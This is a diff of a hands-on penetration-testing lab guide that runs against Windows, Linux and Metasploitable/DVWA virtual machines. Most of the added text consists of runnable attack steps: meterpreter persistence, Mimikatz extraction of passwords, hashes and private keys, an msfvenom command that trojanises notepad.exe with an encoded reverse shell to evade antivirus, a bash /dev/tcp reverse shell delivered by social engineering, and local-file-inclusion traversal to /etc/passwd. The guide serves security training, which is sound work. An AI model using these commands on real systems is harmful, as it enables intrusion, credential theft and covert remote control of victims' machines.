@@ -510,7 +510,8 @@ Note: Take note of the Scan ID because you did not launched the scan you just cr
 	a.	Type nessus_db_import <scan_ID>
 	b.	Type hosts
 	c.	Type vulns <host_ip_address>
-		i.	…it shows you the vulnerabilities for the host and if you use the browser it will show you the colorful graphic representation
+		i.	…it shows you the vulnerabilities for the host and if you use the browser it will show you the colorful graphic
+		representation
 		ii.	…use the metasploitable IP address
 	d.	Use Ctrl+L to clear the screen
 
@@ -632,7 +633,8 @@ for the VM program itself. Google the problem if you’re stuck…this is the be
 	a.	Type run hashdump
 		i.	…you now have the SAM file with users and keys
 		ii.	…the first part before of the hash (before the colon) is not as important anymore because there are not a lot of XP systems
-		in the wild unless you count ATM machines; the second part you can use against a rainbow table program or an online rainbow table website
+		in the wild unless you count ATM machines; the second part you can use against a rainbow table program or an online rainbow table
+		website
 
 -------------------------------------------------------------------------------------------------------------------------------
 Note: Take a look at the SID numbers in the hash dump…what is 500 and 501? Google what they mean.
@@ -721,7 +723,8 @@ to the other. Also, depending on the VM software you are using there are several
 software for the VM program itself. Google the problem if you’re stuck…that’s the best way to troubleshoot and learn.
 -------------------------------------------------------------------------------------------------------------------------------
 
-7.	Run the evilfile.exe file in the victim’s machine, then in a meterpreter prompt should show up in Kali on the same terminal you ran msfconsole from
+7.	Run the evilfile.exe file in the victim’s machine, then in a meterpreter prompt should show up in Kali on the same terminal you ran
+msfconsole from
 
 8.	Here you can run several cool things like:
 	a.	Type help
@@ -810,7 +813,8 @@ Note: We can also use the incognito command along with its options and steal tok
 incognito is and what it does
 -------------------------------------------------------------------------------------------------------------------------------
 
-19.	Upload the payload to the victim’s machine. My original evildoer file which gave use the meterpreter shell was in the Downloads folder therefore when I upload this file it will go to that folder…
+19.	Upload the payload to the victim’s machine. My original evildoer file which gave use the meterpreter shell was in the Downloads folder
+therefore when I upload this file it will go to that folder…
 	a.	Type pwd to find out where you are in the victim’s directory
 	b.	Type upload –f payload.exe c:\\users\\<username>\\downloads
 		i.	…no, the \\ are NOT typos…check the message after uploading to see how they work
@@ -1011,9 +1015,11 @@ use the save command and delete the entire hidden folder using the rm –rf comm
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STEP #15: SNIFFING WINDOWS 7
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-This step continues from step #14. Clear meterpreter but do not log-off. Also close any additional terminal screens.
+	This step continues from step #14.
 
-1.	Type use sniffer
+1.	Clear meterpreter but do not log-off. Also close any additional terminal screens.
+
+2.	Type use sniffer
 	a.	Type help
 	b.	Type sniffer_interfaces
 		i.	…notice their status…one of them is the real WiFi or Ethernet connection if that’s what you’re using…read them carefully
@@ -1022,29 +1028,330 @@ This step continues from step #14. Clear meterpreter but do not log-off. Also cl
 	d.	Type sniffer_stop #
 	e.	Type sniffer_dump # ./Desktop/sniffer.cap
 
-2.	Open Wireshark…
+3.	Open Wireshark…
 	a.	Go to File>Open and find the .cap file in the Desktop
 		i.	…now you can inspect the file based on filters like IPs, Protocols, TCP ports, etc…
 
-3.	On the Apply a display filter box…
+4.	On the Apply a display filter box…
 	a.	Type ip.addr == 192.168.149.128
 	b.	Click on the arrow at the end of the box or hit enter
+
+5.	Exit Wireshark
+
+6.	Go back to meterpreter and search for files…
+	a.	Type search –h
+	b.	Type search –d c:\\users –f *.exe
+		i.	…-d for directory, -f for file
+		ii.	…you can also use .docx, .xls, .rtf, .txt, .jpg
+
+7.	Type ps –S explorer
+	a.	…to look for the process that was moved to the victim
 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STEP #16: PORT FORWARDING
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-This step continues from step #15. Clear meterpreter but do not log-off. Also close any additional terminal screens or programs
+	This step continues from step #15. Clear meterpreter but do not log-off. Also close any additional terminal screens or programs
 
-1.	While in meterpreter…
+8.	While in meterpreter…
 	a.	Type portfwd –h
 	b.	Type portfwd add –l 445 –p 445 –r  <victim_ip_address>
 	c.	Type portfwd list
 
-2.	Open a new terminal screen…
-	a.	Type netstat –an|grep 445
+9.	Open a new terminal screen…
+	a.	Type netstat –an | grep 445
 	b.	Type telnet localhost 445
 
-3.	Back in meterpreter…
+10.	Back in meterpreter…
 	a.	Type portfwd flush
 		i.	…to close
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STEP #17: RUN METERPRETER AS A SERVICE
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+1.	Type run persistence –h
+	a.	Type getuid
+		i.	…you should be a regular user and not System
+		ii.	…if you’re System then reboot the Windows VM or flush msconsole by deleting the saved sessions located in .msf4 hidden folder
+	b.	Type run persistence –U –i 5 –p 443 –r 192.168.26.129
+		i.	…check the flag options and find out what each means
+		ii.	…what is so special about –i?
+
+2.	Type reboot
+		i.	…your connection died
+
+3.	Use Ctrl+C to return to msfconsole
+
+4.	While in \exploit\multi\handler
+	a.	Type run
+		i.	…if the victim logged-on then you will see an automatic connection back to meterpreter
+
+5.	If you’re user is very tech savvy, then he may be able to look for any established connections…you can also do this in meterpreter…
+	a.	Type netstat –an|findstr EST
+		i.	…in the list look for our attacking IP address in port 443
+		ii.	…open a cmd prompt in Kali coming from the victim’s computer and type the same command
+		iii.	…do you remember how to open the cmd prompt?
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STEP #18: USING MIMIKATZ POST EXPLOIT TOOL
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Mimikatz is a post exploitation tool that it’s used to extract plaintext passwords, hashes, PIN codes and Kerberos tickets from RAM. While in meterpreter…
+
+1.	Make sure you are NT Authority\System from the previous step…if not then become one and continue below
+
+2.	Type sysinfo
+
+3.	Type use mimikatz …mimikatz is loaded in meterpreter…
+	a.	Type help mimikatz
+	b.	Type mimikatz_command –f version
+		i.	…runs a custom command to check the version
+	c.	Type mimikatz_command –f fu::
+		i.	…it display available modules
+		ii.	…all modules here must have :: at the end of the command
+	d.	Type Kerberos
+		i.	…will try to displays any Kerberos credentials in memory
+	e.	Type msv
+		i.	…will try to display any hashes in memory
+	f.	Type livessp
+	g.	Type wdigest
+
+4.	Check for hashes or bootkeys…
+	a.	Type mimikatz_command –f samdump::
+	b.	Type mimikatz_command –f samdump::hashes
+	c.	Type mimikatz_command –f samdump::bootkey
+
+5.	Check memory dumps…
+	a.	Type mimikatz_command –f sekurlsa::
+	b.	Type mimikatz_command –f sekurlsa::searchPasswords
+
+6.	Check for and kill processes…
+	a.	Type mimikatz_command –f handle::
+	b.	Type mimikatz_command –f handle::list
+
+7.	Check for crypto certificates…
+	a.	Type mimikatz_command –f crypto::
+	b.	Type mimikatz_command –f crypto::listKeys
+	c.	Type mimikatz_command –f crypto::listProviders
+		i.	…use to list and export certificates and their corresponding private keys even when marked as non-exportable
+
+8.	Check victim’s system…
+	a.	Type mimikatz_command –f system::
+	b.	Type mimikatz_command –f system::user
+	c.	Type mimikatz_command –f system::computer
+
+9.	Check user privilege levels…
+	a.	Type mimikatz_command –f privilege::
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STEP #19: HOW TO EMBED AN EXPLOIT INTO A BINARY FILE
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+While connected to your victim…
+
+1.	Make sure you are NT Authority\System
+
+2.	Type pwd …to see in what directory in Windows you are located
+	a.	…you should be in C:\Windows\System32
+	b.	Type download notepad.exe
+	c.	Type ls note* …to verify
+
+3.	Open a second terminal screen…
+	a.	Type ls note*
+
+4.	Type msfvenom –a x86 --platform windows –x notepad.exe –k –p windows/meterpreter/reverse_tcp lhost =<kali_ip_address>
+	lport=443 –e x86/shikata_ga_nai –i 3 –b “\x00” –f exe –o <a_cool_interesting_name>.exe
+	a.	Type ls …to verify
+		i.	…try to infect other files like sticky notes
+
+Let me break this down for you…
+	-a – the architecture of the victim’s machine…Windows 32 (x86) or 64 (amd64)
+	-x – the executable we’ll be using
+	-k – using the same template
+	-p – your payload
+	-i – times we’ll code this to try to avoid detection from the AV
+	-e – using the default encoder (no need to type but here as example)
+	-b – exclude null bytes
+	-f – creates an exe format (you can use other formats too)
+	-o – the output
+-------------------------------------------------------------------------------------------------------------------------------
+Note: The size of the new file will increase
+-------------------------------------------------------------------------------------------------------------------------------
+
+5.	Go back into meterpreter
+	a.	Type cd c:/users/<username>/desktop
+		i.	…you need to know what user you’re currently using…
+		ii.	…try getuid or shell > net user
+	b.	Type upload <new_executable>.exe
+
+-------------------------------------------------------------------------------------------------------------------------------
+Note: Take not that from Kali you need to enter / to move between directories at your victim’s Windows machine…while in the Windows
+shell you will use the normal \ to do the same
+-------------------------------------------------------------------------------------------------------------------------------
+
+6.	Go to your Windows VM and check the desktop
+
+7.	Go back to Kali and exit all the way to root
+
+8.	Type msfconsole
+	a.	Type use exploit/multi/handler
+		i.	…if you didn’t save the settings you need to do it all over again
+	b.	Type run or exploit
+
+9.	Go to Windows and run the new file…
+		i.	…you should be getting the meterpreter shell in Kali
+		ii.	…if youstill have the auto run program running from the registry then it will auto login into meterpreter…you need to stop this
+		and then try this exercise
+
+10.	Now escalate your privilege level to System
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STEP #20: GETTING A REVERSE SHELL IN LINUX
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+You will need another Linux VM for this step.
+
+1.	Setup the Linux VM to use 2GB RAM and a 2 CPUs
+
+2.	Let’s create a bash script payload…open a terminal screen and…
+	a.	Type nano evilfile.sh
+	b.	Enter the following:
+		i.../bin/bash –i > /dev/tcp/<kali_ip_address>/8080 0<&1 2>&1
+	c.	Ctrl+X to save, Y to save
+
+3.	Now we get the victim to download the file. You can do it through social engineering or as a download through the
+	Apache website or even easier to move the file using a USB stick.
+
+4.	In Kali, we’ll put a netcat session in listening mode…
+	a.	Type nc –nlvp 8080
+		i.	…nc is in listening mode
+
+5.	At the victim’s machine, give the file executable rights…
+	a.	Type chmod 755 evilfile.sh
+	b.	Find the file and type ./evilfile.sh
+-------------------------------------------------------------------------------------------------------------------------------
+Note: Have you ever used the TAB key? Type the first two or three letters of a filename then hit TAB…you’re welcome!
+-------------------------------------------------------------------------------------------------------------------------------
+
+6.	Back in Kali you will see that the victim has connected to us…
+
+7.	So many things to do here…
+	a.	Type hostname
+		i.	…shows you the current user
+	b.	Type id
+		i.	…to see the UID’s for the user, groups, admin, etc
+	c.	Type ifconfig
+		i.	…you can also use hostname -I
+	d.	Type blkid
+		i.	…shows you all the devices attached
+	e.	Type netstat –tulpn
+		i.	…shows open listening ports
+	f.	Type service --status-all
+		i.	…shows you all services running
+	g.	Type uname –a
+		i.	…shows you the Linux version and architecture
+	h.	Type less /etc/passwd
+		i.	…shows you the users and rights
+	i.	Type df –h
+		i.	…shows you the hard drive space
+	j.	Type lspci
+		i.	…shows you the PCI bridges, controllers and devices
+-------------------------------------------------------------------------------------------------------------------------------
+Note: UIDs are the equivalent of SAM files in Windows
+-------------------------------------------------------------------------------------------------------------------------------
+
+8.	We cannot use nmap within netcat but we can use netcat to do a scan for us…
+	a.	Type nc –v –w 1 <victim_ip_address> -z 1-1000
+		i.	…-v is verbose, -w 1 wait 1sec, -z operates in zero I/O mode which ignores any latency from the CPU, 1-1000 are the ports
+	b.	Type nc –nuvw 2 <victim_ip_address> -z 1-1000
+		i.	…n bypasses the name resolution, u is for UDP ports
+		ii.	…adding extra seconds can make it more accurate
+		iii.	…search for what other great things you can do with netcat
+
+9.	Let’s upload a file to the victim…
+	a.	Type nc <victim_ip_address> < file.txt
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STEP #21: LOCAL FILE INCLUSION VULNERABILITIES
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+1.	Run metasploitable
+	a.	Make sure you have both NICs in NAT
+	b.	Make sure you have the correct IP address for it
+
+2.	Go to Kali and open a browser
+	a.	Type <victim_ip_address>
+		i.	…you should see the metasploitable website
+	b.	Click on the DVWA link
+		i.	…use admin/password
+
+3.	In DVWA click on the DVWA Security and set it to low
+	a.	Click on the File Inclusion button
+
+4.	Open a terminal screen…
+	a.	Type ssh msfadmin@<victim_ip_address>
+	b.	Type msfadmin …unless you changed it
+
+5.	Locate the .php file that shows up on the File Inclusion page…
+	a.	Type cat –n /var/www/dvwa/vulnerabilities/fi/index.php
+	b.	Take a look at line #15 and line #35…line #15 is the drop-down menu and line #35 is a command to include any file you want
+		i.	…in the browser click on the View Source button
+
+6.	While in the browser, look at the IP address and its subfolders…if you count the IP all the way to the /?page=include.php
+	there are five positions…you can try to traverse them and see what you can get
+
+7.	In the browser erase include.php and add the following…
+	a.	Type <metasploit_ip_address>/dvwa/vulnerabilitites/fi/?page=../../../../../etc/passwd
+		i.	…you can read the password file
+	b.	Change /password for /resolv.conf
+		i.	…you can see the nameserver IP address
+
+-------------------------------------------------------------------------------------------------------------------------------
+Note: resolv.conf is a plaintext file that is used to configure DNS resolver and used to manage the configuration tasks of a system
+-------------------------------------------------------------------------------------------------------------------------------
+
+8.	Go back to the DVWA website in your browser…
+	a.	Click on the PHP Info button
+	b.	Take a look at the path of the Loaded Configuration File
+
+-------------------------------------------------------------------------------------------------------------------------------
+Note: Up until now we have never used vi text editor…vi is very complicated and best used for terminal servers but since metasploitable
+has no nano editor, we’ll need to use it…here’s a quick intro:
+
+	Key		Movement
+	---		------------
+	/		search
+	zz		save and quit
+	:w		save
+	h		left one
+	j		down one
+	k		up one
+	l		right one
+	x		delete 				(use the delete key also)
+	i		insert text left of cursor
+	a		insert text right of cursor
+	w		forward word by word
+	b		backward word by word
+	$		to end of line
+	0		to beginning of line
+	H		to top line of screen
+	M		to middle line of screen
+	L		to last line of screen
+	G		to last line of file
+	1G		to first line of file
+	Ctrl+f		scroll forward one screen
+	Ctrl+b		scroll backward one screen
+	Ctrl_d		scroll down one-half screen
+	Ctrl_d		scroll up one-half screen
+	------------------------------------------------------------------------------------------------------------------------------
+
+9.	We’ll need to edit the php.ini file so, in the terminal screen…
+	a.	Type vi /etc/php5/cgi/php.ini
+	b.	Press / then type allow_url and press enter
+	c.	Change allow_url_include = ON
+		i.	…verify allow_url_fopen is ON also
+	d.	:q! then enter to save you changes
